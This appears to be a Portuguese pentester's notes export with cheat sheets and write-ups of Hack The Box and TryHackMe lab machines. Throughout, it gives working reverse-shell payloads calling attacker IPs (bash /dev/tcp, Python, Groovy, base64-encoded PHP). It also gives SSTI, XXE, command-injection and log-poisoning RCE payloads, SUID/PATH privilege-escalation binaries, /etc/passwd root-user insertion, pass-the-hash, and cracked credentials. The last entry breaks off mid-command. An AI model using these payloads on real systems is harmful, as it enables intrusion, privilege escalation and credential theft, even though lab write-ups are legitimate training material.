{"Notes/CMS/Wordpress":{"title":"Wordpress","links":[],"tags":[],"content":"Enumeração:\r\nwpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://$RHOST --plugins-detection aggressive --api-token &lt;API_TOKEN&gt;\r\nBrute force:\r\nwpscan --url http://$RHOST --passwords &lt;WORDLIST&gt;"},"Notes/PrivEsc-Linux/Enumeração-Automatizada":{"title":"Enumeração Automatizada","links":[],"tags":[],"content":"Enumeração Automatizada\nLinPeas: https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\nLinEnum: https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh\nLES (Linux Exploit Suggester): https://github.com/The-Z-Labs/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh\nLinux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh\nLinux Priv Checker: https://github.com/linted/linuxprivchecker"},"Notes/PrivEsc-Linux/Exploração":{"title":"Exploração","links":[],"tags":[],"content":"Identificação de permissões sudo\nsudo -l\nBuscando senhas no log:\ngrep -Ri password /var/log 2&gt;/dev/null\nIdentificação de permissões SUID\nfind / -perm -u=s -type f 2&gt;/dev/null\nIdentificação de permissões Capabilities\ngetcap -r / 2&gt;/dev/null\nIdentificação de scripts programados (Cron Jobs)\ncat /etc/crontab\r\nCaso um script não possua o caminho absoluto definido no /etc/crontab, o cron irá buscar o arquivo nos diretórios definidos no PATH.\r\nLembre-se de dar a permissão de execução ao script.\nManipulando a variável PATH\nIdentificando diretórios com permissão de gravação:\r\nfind / -writable 2&gt;/dev/null\r\nfind / -writable 2&gt;/dev/null | cut -d &quot;/&quot; -f 2,3 | grep -v proc | sort -u\r\nAdicionando a pasta /tmp ao PATH:\r\nexport PATH=/tmp:$PATH\r\nCriando um binário com o script que irá executar um comando:\n#include&lt;unistd.h&gt;\r\nvoid main()\r\n{ setuid(0);\r\n  setgid(0);\r\n  system(&quot;cmd&quot;);\r\n}\n\nPara compilar o código acima utilize o compilador GCC:\r\ngcc binario.c -o binario -w\r\nAltere as permissões do binário para SUID:\r\nchmod u+s binario\r\nAgora criamos o comando que será executado:\r\necho &quot;/bin/bash&quot; &gt; cmd\r\nAlteramos a permissão do comando criado:\r\nchmod 777 cmd\r\nE executamos o binário com o script que irá chamar o comando.\r\nLembre-se de que os arquivos devem estar em um local com permissão de escrita, além do diretório estar declarado na variável PATH.\nExplorando serviços de compartilhamento de arquivos (NFS)\nNa máquina alvo, verifique se existe diretórios compartilhados com a permissão no_root_squash:\r\ncat /etc/exports\r\nNa máquina atacante, verifique quais diretórios estão permitidos realizar a montagem:\r\nshowmount -e IP\r\nCrie uma pasta na máquina atacante e faça a montagem do diretório remoto no diretório criado:\r\nsudo mount -o rw IP:/shared/remote/folder /local/folder\r\nNa pasta local, crie um script que irá executar a shell:\n#include&lt;unistd.h&gt;\r\nvoid main()\r\n{ setuid(0);\r\n  setgid(0);\r\n  system(&quot;/bin/bash&quot;);\r\n  return 0;\r\n}\n\nCompile o script utilizando o GCC:\r\nsudo gcc root.c -o root -static\r\nAltere as permissões do binário criado para SUID:\r\nsudo chmod +s root\r\nExecute na máquina remota para escalar privilégio.\nAdicionando um usuário com privilégio root\nCriar o hash da senha que será utilizada:\r\nopenssl passwd -1 -salt HACK senha123\nAdicione as informações do usuário no arquivo /etc/passwd:\r\nhacker3:\\$1\\$lord\\$jZwvvuLH/snkFA6S/AJA6.:0:0:root:/root:/bin/bash\nAgora é só trocar para o usuário criado:\r\nsu hacker\npython -c &#039;import crypt; print(crypt.crypt(senha123, &quot;$6$lord&quot;))&#039;\r\n`\n\\$1\\$lord\\$jZwvvuLH\\/snkFA6S\\/AJA6\\."},"Notes/PrivEsc-Linux/Links-de-referência":{"title":"Links de referência","links":[],"tags":[],"content":"Vulnerabilidades conhecidas em Kernels\nhttps://www.linuxkernelcves.com/cves\nExploração de binários\nhttps://gtfobins.github.io/ -  Linux\r\nhttps://lolbas-project.github.io/ - Windows\nMSF Venom Builder\nhttps://pentest.ws/tools/venom-builder"},"Notes/PrivEsc-Linux/Principais-Arquivos":{"title":"Principais Arquivos","links":[],"tags":[],"content":"/etc/passwd Lista de usuários do sistema operacional.\n/etc/shadow Lista dos hashes das senhas dos usuários.\n/proc/version Arquivo com informações sobre o sistema operacional, versão do kernel e compiladores instalados (ex. GCC).\n/etc/issue Informações sobre o sistema operacional."},"Notes/PrivEsc-Linux/Principais-Comandos":{"title":"Principais Comandos","links":[],"tags":[],"content":"hostname Retorna o hostname da máquina.\nuname -a Retorna as informações do sistema, com detalhes sobre o kernel utilizado.\nps aux O comando ps exibe os processos que estão rodando no sistema. As flags (a) exibe os processos de todos os usuários, (u) qual usuário iniciou um processo e (x) exibe os processos que não estão atrelados a um terminal.\nenv Exibe as variáveis de ambiente.\nsudo -l Lista os comandos que o usuário tem permissão para executá-los como root.\nls -la Para listar arquivos e diretórios em lista e ocultos.\nid $user Exibe informações do usuário como nível de privilégio e grupos associados.\nhistory Exibe o histórico de comandos executados no terminal.\nifconfig Exibe as informações das interfaces de rede da máquina.\nip route Exibe as rotas de rede existentes."},"Notes/PrivEsc-Linux/Utilitários---find":{"title":"Utilitários - find","links":[],"tags":[],"content":"find / -name $arquivo 2&gt;/dev/null Procura por um arquivo pelo nome.\r\nfind / -type d -name $diretorio 2&gt;/dev/null Procura por um diretório pelo nome.\r\nfind / -type f -perm 0777 2&gt;/dev/null Encontra arquivos com permissão total (Leitura, gravação e execução por todos usuários)\r\nfind / -perm a=x 2&gt;/dev/null Encontra arquivos executáveis.\r\nfind / -user $username 2&gt;/dev/null Encontra todos os arquivos de um usuário específico.\r\nfind / -mtime 10 2&gt;/dev/null Encontra arquivos modificados nos últimos 10 dias.\r\nfind / -atime 10 2&gt;/dev/null Encontra arquivos acessados nos últimos 10 dias.\r\nfind / -cmin -60 2&gt;/dev/null Encontra arquivos modificados na última hora.\r\nfind / -amin -60 2&gt;/dev/null Encontra arquivos acessados na última hora.\r\nfind / -size +50M 2&gt;/dev/null Encontre arquivos com 50 Mb de tamanho ou mais.\r\nfind / -writable -type d 2&gt;/dev/null  Encontrar diretórios com permissão de gravação.\r\nfind / -perm -222 -type d 2&gt;/dev/null Encontrar diretórios com permissão de gravação.\r\nfind / -perm -o w -type d 2&gt;/dev/null Encontrar diretórios com permissão de gravação.\r\nfind / -perm -o x -type d 2&gt;/dev/null Encontrar diretórios com permissão de execução.\r\nfind / -perm -u=s -type f 2&gt;/dev/null Encontrar arquivos com SUID."},"Notes/PrivEsc-Linux/Utilitários---netstat":{"title":"Utilitários - netstat","links":[],"tags":[],"content":"netstat -a Exibe todas as portas de escuta (listen) e as conexões estabelecidas.\r\nnetstat -l Exibe todas as portas de escuta, prontas para receber uma conexão.\r\nnetstat -s Exibe as estatísticas de uso da rede por protocolo.\r\nnetstat -p Exibe o nome do serviço e o PID das conexões.\r\nnetstat -i Exibe as estatísticas das interfaces de rede.\r\nnetstat -ano Exibe todas as conexões (a), não resolve os nomes (n) e exibe o temporizador (o)."},"Notes/PrivEsc-Windows/Exploração":{"title":"Exploração","links":[],"tags":[],"content":"Impersonation Privileges\nVerifique se o usuário possui a permissão SeImpersonatePrivilege com o comando whoami /priv. Caso esteja como enable, utilize o exploit PrintSpoofer.exe.\r\nLink: https://github.com/itm4n/PrintSpoofer/releases\r\n "},"Notes/PrivEsc-Windows/Principais-Comandos":{"title":"Principais Comandos","links":[],"tags":[],"content":"whoami /priv Verifica os privilégios do usuário atual.\r\nver Verificar a versão do Windows\r\nwmic os get osarchitecture Verificar a arquitetura do sistema operacional\r\nsysteminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; /C:&quot;System Type&quot; Verifica nome e versão do Windows\r\nroute PRINT Verificar as rotas de rede da máquina\r\nnetstat -ano Verificar as conexões TCP e UDP\r\ndir /R Verificar arquivos com stream\r\npowershell Get-Content -Path &quot;hm.txt&quot; -Stream &quot;root.txt&quot; Extrair stream de arquivos\nRef:\nhttps://nored0x.github.io/red-teaming/windows-enumeration/"},"Notes/Serviços/135--":{"title":"135 -","links":[],"tags":[],"content":""},"Notes/Serviços/139,-445---SMB":{"title":"139, 445 - SMB","links":[],"tags":[],"content":"Listar pastas compartilhadas:\r\n`smbclient —no-pass -L //$RHOST\nConectar a uma pasta compartilhada:\r\nsmbclient --no-pass //$RHOST/&lt;PASTA&gt;"},"Notes/Serviços/3389--":{"title":"3389 -","links":[],"tags":[],"content":""},"Notes/Serviços/80---HTTP":{"title":"80 - HTTP","links":[],"tags":[],"content":"Enumeração de diretórios e arquivos:\r\nferoxbuster -u http://$RHOST/ -A -r -x txt -q -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -C 404 --dont-scan &#039;manual&#039;\nPHP\nErro de include em PHP, faça o teste com filter para converter o arquivo em Base64:\r\nhttp://$RHOST/?param=php://filter/read=convert.base64-encode/resource=[LFI]\r\nPara ignorar a extensão no final da URL caso a mesma seja adicionada automaticamente, utilize Null Byte:\r\n%00"},"Notes/Shell/Reverse-Shell":{"title":"Reverse Shell","links":[],"tags":[],"content":"Payloads:\nBash:\n/bin/bash -c &#039;bash -i &gt; /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1\r\nbash -i &gt;&amp; /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1\nShell reversa com script bash:\n\nCrie um script em bash com o payload bash -i &gt;&amp; /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1 e extensão .sh.\nInicie um servidor http na máquina atacante com python3 -m http.server 80\nFaça o download do script na máquina alvo na pasta temporária com curl http://$LHOST/shell.sh -o /tmp/shell.sh\nAltere a permissão de execução do arquivo no alvo com chmod +x /tmp/shell.sh\nExecute o script no alvo com /bin/bash /tmp/shell.sh\n\nCriar shell reversa em PHP no alvo com echo, utilize o comando abaixo para gerar o payload:\necho &quot;echo $(echo &quot;&lt;?php exec(\\&quot;/bin/bash -c &#039;bash -i &gt;&amp; /dev/tcp/10.9.58.140/443 0&gt;&amp;1&#039;\\&quot;); ?&gt;&quot; | base64) | base64 -d &gt; shell.php&quot;\n \n# Payload:\n \n#echo PD9waHAgZXhlYygiL2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjkuNTguMTQwLzQ0MyAwPiYxJyIpOyA/Pgo= | base64 -d &gt; shell.php"},"Notes/Shell/Upgrade-TTY":{"title":"Upgrade TTY","links":[],"tags":[],"content":"https://security.stackexchange.com/questions/251326/upgrading-a-reverse-shell-with-stty-raw-echo-doesnt-work\nSimple Upgrade:\r\npython3 -c &#039;import pty;pty.spawn(&quot;/bin/bash&quot;)&#039;\r\nexport TERM=xterm"},"Write-up/Hack-The-Box/Bashed/Bashed---Write-up":{"title":"Bashed - Write-up","links":[],"tags":[],"content":"Enumeração dos serviços:\r\n\r\nEnumeração de diretórios e arquivos:\nferoxbuster -u http://10.10.10.68 -A -x txt -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -C 404\nDescoberta do arquivo http://10.10.10.68/dev/phpbash.php onde é possível executar comandos no servidor:\r\n\r\nVamos criar um arquivo em PHP que irá enviar a shell reversa para a máquina atacante dentro de /var/www/html/uploads e acessar o arquivo no endpoint /uploads.shell.php\necho PD9waHAgZXhlYygiL2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjcvMTIzNCAwPiYxJyIpOyA/Pgo= | base64 -d &gt; shell.php\nAo rodar o comando sudo -l percebemos que o usuário scriptmanager tem permissão de sudo em todos os binários.\r\n\r\nVamos então fazer a movimentação lateral com o comando: sudo -u scriptmanager /bin/bash.\r\n\r\nCom o usuário scriptmanager, podemos procurar por arquivos que pertencem a esse usuário e encontramos o test.py dentro de /scripts/test.py\r\n\r\nAnalisando a pasta /scripts percebemos que o script roda periodicamente e cria um arquivo com permissões root dentro da mesma pasta.\r\nVamos então incluir uma linha no scrip que irá nos enviar a shell do root:\necho &#039;import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.7&quot;,1222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/bash&quot;)&#039; &gt;&gt; test.py\nAguardamos um pouco e recebemos a shell como root:\r\n"},"Write-up/Hack-The-Box/CozyHosting/CozyHosting---Write-up":{"title":"CozyHosting - Write-up","links":[],"tags":[],"content":"\r\n\r\n\r\n\r\nAplicação Bootstrap 5.2.3"},"Write-up/Hack-The-Box/Jeeves/Jeeves---Write-up":{"title":"Jeeves - Write-up","links":[],"tags":[],"content":"Enumeração de serviços:\r\n\r\nEnumeração de diretórios:\nferoxbuster -u http://10.10.10.63:50000 -A -r -x txt -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -C 404\nDescoberta do Jenkins rodando no endpoint: /askjeeves\r\nNavegando nas configurações, temos a opção Script Console, onde podemos inserir scripts em Groovy que serão executados pelo servidor. Vamos então inserir um script que irá nos enviar o shell do host:\r\n\nString host=&quot;$LHOST&quot;;\n \nint port=$LPORT;\n \nString cmd=&quot;cmd.exe&quot;;\n \n \n \nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\n \nSocket s=new Socket(host,port);\n \nInputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();\n \nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\n \nwhile(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());\n \n                     while(pe.available()&gt;0)so.write(pe.read());\n \n                     while(si.available()&gt;0)po.write(si.read());\n \n                     so.flush();po.flush();Thread.sleep(50);\n \n                     try {p.exitValue();\n \n                          break;\n \n                         }catch (Exception e){}};\n \n  p.destroy();\n \ns.close();\nAo executar obtemos a shell do host:\r\n\nAnalisando os diretórios da máquina alvo, encontramos o arquivo CEH.kdbx que é uma base de dados de um cofre de senhas. Podemos quebrar a senha master com ajuda do John the Ripper:\r\n\r\nVamos então baixar o software KeePass, carregar o arquivo de backup e utilizar a senha encontrada:\r\n\r\nCredenciais:\nanonymous:Password\r\nMichael321:12345\r\nadmin:S1TjAtJHKsugh9oC4VZl\r\nhackerman123:pwndyouall!\r\nbob:lCEUnYPjNfIuPZSzOySA\r\nadministrator:S1TjAtJHKsugh9oC4VZl\r\nadmin:\r\n?:aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00\n\nAgora podemos utilizar o método Pass The Hash, para logar no alvo utilizando o hash encontrado.\npth-winexe -U\n \njeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cb\n \ne81fe00 //10.10.10.63 cmd"},"Write-up/Hack-The-Box/RedPanda/RedPanda---Write-up":{"title":"RedPanda - Write-up","links":[],"tags":[],"content":"Enumeração de serviços:\r\n\r\nApós alguns testes de injeção na barra de pesquisa do site, encontramos uma vulnerabilidade de SSTI (Server Side Template Injection) com o payload: *{{7*7}}.\r\n\r\nPodemos executar comandos no alvo com o payload:\n*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&#039;id&#039;).getInputStream())}\nVamos pegar uma shell reversa da seguinte forma:\n\nCrie um script em bash com o payload bash -i &gt;&amp; /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1 e extensão .sh.\nInicie um servidor http na máquina atacante com python3 -m http.server 80\nFaça o download do script na máquina alvo na pasta temporária com curl http://$LHOST/shell.sh -o /tmp/shell.sh\nAltere a permissão de execução do arquivo no alvo com chmod +x /tmp/shell.sh\nExecute o script no alvo com /bin/bash /tmp/shell.sh\n\nAgora com a shell, fazemos a enumeração dos arquivos em busca de credenciais no código da aplicação feita em Java com Spring Boot e encontramos no arquivo: /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java \r\nAgora é só logar via SSH:\r\nwoodenk:RedPandazRule\nMáquina muito hard\nNecessário analisar os arquivos rodando periodicamente e analisar o arquivo: /opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java\r\nCom isso será possível identificar que o código faz um parse do log /opt/panda_search/redpanda.log buscando pelo caminho das imagens e retirando apenas o valor de Artist das imagens, para então concatenar esse valor em um XML. Dessa forma precisamos fazer um XXE alterando a tag Artist de uma imagem, incluindo o payload XXE para trazer o SSH do root e fazer um curl para manipular o caminho da imagem que será gravado no log.\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n \n&lt;!DOCTYPE author [&lt;!ENTITY xxe SYSTEM &#039;file:///root/.ssh/id_rsa&#039;&gt;]&gt;\n \n&lt;credits&gt;\n \n  &lt;author&gt;&amp;xxe;&lt;/author&gt;\n \n  &lt;image&gt;\n \n    &lt;uri&gt;/img/greg.jpg&lt;/uri&gt;\n \n    &lt;views&gt;1&lt;/views&gt;\n \n  &lt;/image&gt;\n \n  &lt;image&gt;\n \n    &lt;uri&gt;/img/hungy.jpg&lt;/uri&gt;\n \n    &lt;views&gt;1&lt;/views&gt;\n \n  &lt;/image&gt;\n \n  &lt;image&gt;\n \n    &lt;uri&gt;/img/smooch.jpg&lt;/uri&gt;\n \n    &lt;views&gt;1&lt;/views&gt;\n \n  &lt;/image&gt;\n \n  &lt;image&gt;\n \n    &lt;uri&gt;/img/smiley.jpg&lt;/uri&gt;\n \n    &lt;views&gt;1&lt;/views&gt;\n \n  &lt;/image&gt;\n \n  &lt;totalviews&gt;4&lt;/totalviews&gt;\n \n&lt;/credits&gt;\nAlterar o artist da imagem:\r\nexiftools -Artist=&#039;../tmp/hax smooch.jpg\nSuba os dois arquivos para a máquina alvo e altere o nome do XML para hax_creds.xml\nFazer o curl manipulando o User Agent do site:\r\ncurl -A &quot;evil||/../../../../../../../../../../tmp/smooch.jpg&quot; http://10.10.11.170:8080/\r\n`\r\n“"},"Write-up/Hack-The-Box/Sau/Sau---Write-up":{"title":"Sau - Write-up","links":[],"tags":[],"content":"Esse é meu primeiro write-up de uma máquina do Hack The Box, é um resumo de como fiz a exploração da máquina SAU lançada em 2023. É uma máquina de nível fácil e explora falhas como SSRF e Command Injection, então borá lá!\nIniciando a enumeração das portas abertas no alvo e quais os serviços rodando nas respectivas portas:\n# Identificação das portas abertas:\n \nnmap -Pn -sS 10.10.11.224\n \n \n \n#Identificação dos serviços nas portas abertas:\n \nnmap -Pn -sV -sC -p 22,80,55555 10.10.11.224\n\r\nO resultado inicial com nmap nos mostrou as portas 22 e 55555 abertas rodando os protocolos de SSH e HTTP respectivamente, além da porta 80 filtrada, indicando que provavelmente existe um serviço de HTTP rodando ali, mas está sendo filtrado para acesso externo pelo firewall.\nVamos então acessar o serviço rodando na porta 55555 e verificar se conseguimos mais informações.\n\nAo acessar a porta específica, fomos direcionados para a página inicial de um aplicativo web, o request-baskets na versão 1.2.1.\r\nConforme documentação oficial, o request-baskets é um serviço de captura de requisições HTTP para análise, resumidamente é possível criar um link personalizado (Basket), capturar as requisição recebidas e visualiza-las a partir de um gerenciador web.\r\nVamos então criar um novo link e verificar o que mais podemos fazer com ele.\n\r\nAo clicar em Open Basket após gerar um link, somos redirecionados para o gerenciador de Baskets onde temos algumas opções, entre elas as de configurações do link personalizado.\nDentro das configurações do link, temos a opção de encaminhar o usuário que acessar o Basket para outro site (Forward URL).\r\nEssa opção acendeu um alerta para a vulnerabilidade de SSRF (Server Side Request Foreign), uma falha onde uma URL maliciosa é enviada para o servidor e o mesmo faz uma requisição para essa URL.\nA primeira coisa que me veio a cabeça foi, e se eu tentar fazer a requisição para validar se existe mesmo um serviço rodando internamente na porta 80?\nEntão configurei a opção Forward URL como http://localhost/ (Quando omitimos a porta da URL, a requisição será enviada com a porta 80 por padrão) e ativei as opçãos Proxy Reponse pra que as respostas recebidas pelo servidor fossem encaminhadas de volta, e a opção Expand Forward Path pra que os diretório que forem adicionar ao final da URL do nosso link, sejam adicionadas a URL de encaminhamento também.\n\nAo salvar e abrir o link em uma nova guia, somos redirecionados para o serviço rodando internamente no servidor, como suspeitado.\n\nDessa forma foi possível identificar um outro serviço, o Maltrail na versão 0.53.\nO Maltrail é um sistema de detecção de tráfego malicioso e com uma rápida pesquisa na internet, descobrimos uma vulnerabilidade de Command Injection nas versões abaixo da 0.54.\nA falha consiste na exploração do parâmetro username, enviado em um método POST na página de login da aplicação localizada em /login. Pra executar comando é necessário somente acrescentar o ; após o valor de username e inserir o comando entre crase.\nVamos então validar a vulnerabilidade enviando uma requisição com o curl. Pra isso montados o seguinte payload:\ncurl -i http://10.10.11.224:55555/5n9i9og/login --data &#039;username=;`id`&#039;\n\nAo enviar o comando recebemos apenas a resposta de falha no login, mas não recebemos a saída do comando id. Pra tirar a dúvida se o RCE estava funcionando ou não resolvi fazer outro teste, ao invés de enviar o id diretamente, abri a porta 80 na minha máquina e enviei uma requisição utilizando curl da máquina alvo pra minha, acrescentando o comando $(id) no final da URL, dessa forma:\ncurl -i http://10.10.11.224:55555/5n9i9og/login --data &#039;username=;`curl http://10.10.14.225/$(id)`&#039;\n\r\nE deu certo! A resposta do comando id retornou no cabeçalho da requisição feita pelo alvo.\r\nDessa forma foi possível validar que a exploração da vulnerabilidade estava funcionando, podemos agora pegar um shell reversa.\r\nVamos utilizar um payload de shell reversa em python3 e ofuscado com base64.\r\nPrimeiro criptografamos os comandos da shell reversa em Base64:\necho -n &quot;python3 -c &#039;import os,pty,socket;s=socket.socket();s.connect((\\&quot;10.10.14.225\\&quot;,80));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\&quot;/bin/sh\\&quot;)&#039;&quot; | base64\nA técnica de ofuscação consiste em enviar o comando da shell reversa criptografado em base64 e concatenado com os comandos que irão descriptografar o dado e executa-lo respectivamente, ficando então assim nosso payload final:\necho+{SHELL-EM-B64}+|+base64+-d+|+sh\nVamos repetir o processo feito para validar a vulnerabilidade, mas agora enviamos o payload da shell reversa.\r\n\r\nAo enviar a requisição para o servidor, recebemos a shell do alvo em nossa porta aberta.\nCapturamos a flag de user da máquina e finalizamos a primeira etapa da exploração. Vamos então seguir para a escalação de privilégio e encontrar a flag de root.\nA primeira coisa que faço ao acessar um alvo linux é buscar por binários com permissão SUID, ou seja, são programas que o usuário comum pode executar com privilégios de root, mesmo não sendo.\r\nUtilizando o utilitário find podemos encontrar esses arquivos no alvo:\nfind / -perm -u=s -type f 2&gt;/dev/null\nA pesquisa não retornou nenhum binário em potencial que pudesse ser explorado, então vamos dar uma olhada nas permissões de execução como SUDO, utilizando o comando sudo -l.\n\r\nAgora sim temos algo que podemos explorar, o usuário atual tem permissão de executar o comando systemctl com SUDO sem exigir a senha do mesmo, mas o detalhe é que temos permissão para executar apenas a opção status do serviço trail.service. Nenhuma outra opção ou serviço é permitido.\n\nDepois de algum tempo tentando explorar o systemctl, percebi que quando executado como sudo, a saída do comando entra no modo less. Esse modo permite a visualização da saída do terminal de forma paginada, mas também permite trazer a shell de um usuário durante a paginação.\nVamos então executar o systemctl utilizando sudo e após o inicio da paginação solicitamos a shell com !sh.\n\r\nI am roooooot!\nConseguimos escalar o privilégio e finalizamos a máquina capturando a flag de root.\nMuito obrigado por ter lido até aqui, espero que tenha gostado e em breve pretendo escrever outros write-ups."},"Write-up/Try-Hack-Me/Archangel/Archangel---Write-up":{"title":"Archangel - Write-up","links":[],"tags":[],"content":"Enumeração dos serviços:\r\n\r\nDescoberta de um hostname:\r\n\r\nInclusão do hostname em etc/hosts:\r\n\r\nFlag 1:\r\n\r\nEnumeração de diretórios e arquivos, com descoberta da página /test.php:\r\n\r\nA página carregada apresenta um botão que ao clicar somos redirecionados para um arquivo dentro do servidor, exibindo o caminho absoluto do mesmo. Isso nos da a ideia de um LFI, podemos tentar converter a página em Base64 utilizando o wraper filter do PHP:\r\nhttp://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php\r\nOutput:\r\n\r\nVamos visualizar o código da página test.php e entender como está sendo feita a validação do parâmetro:\r\n\r\nSão feitas duas validações, a primeira o valor no parâmetro é diferente de ../.. e se existe o caminho /var/www/html/development_testing. Vamos então manipular o valor do parâmetro de forma que as duas validações sejam verdadeiras incluindo duas barras ao invés de uma:\r\n\r\nCom alguns testes, identificamos o arquivo de log do apache em var/log/apache2/access.log podemos então evoluir o LFI para um RCE. Vamos alterar o User-Agent para &lt;?php system($_GET[&#039;lord&#039;]); ?&gt; utilizando um complemento do navegador ou o Burp Suite. Depois podemos acessar a página de log, incluindo o parâmetro &amp;lord=id e confirmamos a saída do comando no final da página:\r\n\r\nCom o RCE funcionando, vamos pegar uma Shell reversa com o payload: /bin/bash -c &#039;bash -i &gt; /dev/tcp/10.9.58.140/443 0&gt;%261&#039;\r\n\r\nAnalisando os arquivos do sistema, identificamos um script do usuário archangel rodando a cada 1 minuto:\r\n\r\nVamos então manipular o script para enviar uma nova shell reversa, dessa vez do usuário archangel:\r\n\r\nE temos a shell do usuário:\r\n\r\nAnalisando os arquivos com permissão SUID, descobrimos o binário backup na pasta home/archangel/secret/backup. Ao executá-lo o binário tenta fazer a cópia de alguns arquivos utilizando o utilitário cp.\r\nPodemos então criar um cp falso que irá chamar a shell.\necho &#039;#!/bin/bash&#039; &gt; cp\r\necho &#039;&#039; &gt;&gt; cp\r\necho &#039;bash -p&#039; &gt;&gt; cp\n\nAgora alteramos a variável PATH para que o cp falso seja executado:\r\nexport PATH=/tmp\r\nE executamos o binário com SUID:\r\n"},"Write-up/Try-Hack-Me/ColddBox/ColddBox---Write-up":{"title":"ColddBox - Write-up","links":[],"tags":[],"content":"Enumeração dos serviços:\r\n\nWordpress 4.1.31\r\nwpscan --url $RHOST\r\n\r\nDescoberta de usuários:\r\n\r\nBrute force:\r\n\r\nc0ldd:9876543210\nLogin no Dashboard do wordpress e shell reversa através da página 404.\nCom a shell, fizemos uma enumeração com o linpeas e encontramos as credenciais do banco de dados do Wordpress:\r\n\r\nE obtemos sucesso ao utilizar a mesma credencial para o usuário do sistema:\r\n\r\nPesquisamos pelos binários com permissão SUID e encontramos o find. Podemos fazer a escalação de privilégio:\r\n"},"Write-up/Try-Hack-Me/DogCat/DogCat---Write-up":{"title":"DogCat - Write-up","links":[],"tags":[],"content":"Enumeração de serviços:\r\n\nIdentificação do uso de include no parâmetro view. LFI utilizando filter para carregar o arquivo PHP que carrega as imagens.\r\nNo código é possível identificar dois requisitos na URL, a palavra cat ou dog e uso de ext, dessa forma identificamos o log do apache e evoluímos pra uma RCE.\r\nCom a shell é possível identificar a segunda flag e abusando do binário env escalamos e pegamos a terceira.\r\nApós analise do script em /opt, descobrimos que é utilizado pela máquina hospedeira do container, então alteramos o script para uma shell reversa e pegamos a quarta flag."},"Write-up/Try-Hack-Me/Gallery/Gallery---Write-up":{"title":"Gallery - Write-up","links":[],"tags":[],"content":"Enumeração dos serviços:\r\n\r\nExploit do CMS Simple Image Gallery:\r\nhttps://www.exploit-db.com/exploits/50214\nhttp://10.10.224.196/gallery/uploads/1706483700_TagoxqanwzqgxdxrjciLetta.php?cmd=/bin/bash%20-c%20%27bash%20-i%20%3E%20/dev/tcp/10.9.58.140/443%200%3E%261%27\nHash do admin encontrado explorando SQLi no parâmetro id do menu de albuns do site.\nMovimentação lateral com senha do usuário mike encontrado no histórico de comandos através do linpeas.\nmike:b3stpassw0rdbr0xx\nEscalação de privilégio através do nano, utilizado por um script com permissão root."},"Write-up/Try-Hack-Me/Gotta-Catch'em-All!/Gotta-Catch'em-All!---Write-up":{"title":"Gotta Catch'em All! - Write-up","links":[],"tags":[],"content":"Enumeração de serviços:\r\n"},"Write-up/Try-Hack-Me/Lockdown/Lockdown---Write-up":{"title":"Lockdown - Write-up","links":[],"tags":[],"content":"Enumeração dos serviços:\r\n\nAdicionamos contacttracer.thm ao arquivo /etc/hosts\r\nEnumeração de diretórios e arquivos:\r\n\r\n\nBypass na tela de login utilizando SQLi: &#039; OR 1=1#.\r\nDepois de logado, podemos subir uma shell reversa em PHP na imagem da logo da empresa. Após o upload é só deslogar e acessar a home novamente.\r\n\nDB:\r\ncts:YOUMKtIXoRjFgMqDJ3WR799tvq2UdNWE\nExtraindo o hash do admin do MySQL:\r\nmysql -u cts -e &#039;use cts_db;select * from users;&#039; -p\nHash:\r\nadmin:3eba6f73c19818c36ba8fea761a3ce6d\nComando para quebrar hash de senha do MySQL:\r\nhashcat -m 0 -a 0 hash-admin.txt /usr/share/wordlists/rockyou.txt\nSenha quebrada:\r\n\r\nadmin:sweetpandemonium\nIdentificando usuários na máquina:\r\n\nTroca para usuário cyrus utilizando su com a senha do admin quebrada anteriormente:\nUsuário tem permissão para execução de script como root\r\n\r\nCria um arquivo .yara nas configurações que irá copiar o /etc/shadow.\r\nQuebra da senha utilizando hashcat do usuário maxine:\r\nmaxine:tiarna\r\nUsuário tem permissão de excutar qualquer binário com sudo:\r\nsudo su"},"Write-up/Try-Hack-Me/Pickle-Rick/Pickle-Rick---Write-up":{"title":"Pickle Rick - Write-up","links":[],"tags":[],"content":"Enumeração de serviços:\r\n\r\nListagem de diretórios e arquivos:\r\n\r\nDescoberta de usuário no código fonte:\r\n\r\nDescoberta da senha em /robots.txt:\r\n\r\nLogin no painel em /login.php:\r\nR1ckRul3s:Wubbalubbadubdub\nUma caixa com execução de comandos é exibida após o login. Alguns comandos foram desativados pelo sistema.\r\nVamos utilizar shell reversa em Perl:\nperl -e &#039;use 